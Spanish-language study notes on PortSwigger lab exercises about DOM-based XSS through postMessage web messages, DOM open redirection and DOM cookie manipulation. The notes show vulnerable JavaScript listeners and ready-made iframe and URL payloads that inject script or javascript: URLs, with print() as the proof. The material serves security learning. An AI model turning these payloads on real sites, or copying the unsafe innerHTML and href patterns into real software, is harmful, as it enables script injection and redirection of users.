
## DOM XSS using web messages
Los web messages es una forma para que dos ventanas se comuniquen entre si, usan la funcion `window` y escuchan a mensajes que usan postMessage y lo que escuche lo pondrá en la pantalla, por eso es vulnerable a XSS
7.
```
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
});
```

es código vulnerable puesto que está a la escucha de cualquier evento y valida el contenido de lo que le llega, y podrá ser vulnerado con :

`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`

el asterisco es a donde va dirigido el mensaje, en este caso el asterisco dice sin preferencia

8. Este lab verifica si http: esta en el mensaje , se explota así:
```
<iframe src="https://0acf006c04b02031b4faff5a008a004c.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

el uso de `javascript:print()` es porque está dentro de un href

9. Si comprueba si es formato JSON.parse : 
```
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

## Dom based open redirection

HTML:

```
<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
```

Exploit: 

```
https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/
```


## Dom based cookie manipulation

script vulnerable que asigna cookies según la ultima pagina visitada:

```
<script>
document.cookie = 'lastViewedProduct=' +     window.location + ';    SameSite=None; Secure'
</script>
```

luego eso se ve reflejado aqui : 
```
  <a href='https://0a0300db04d0e1e1807ed0bc0017001b.web-security-academy.net/product?productId=1</a>
  ```
pero si buscamos el link : 

```
https://0a0300db04d0e1e1807ed0bc0017001b.web-security-academy.net/product?productId=1&payload='
```

con la comilla escapamos href y luego todo lo que escribamos fuera se ejecutara como java script para hacer un xss

Payload final para exploit server : 

```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```
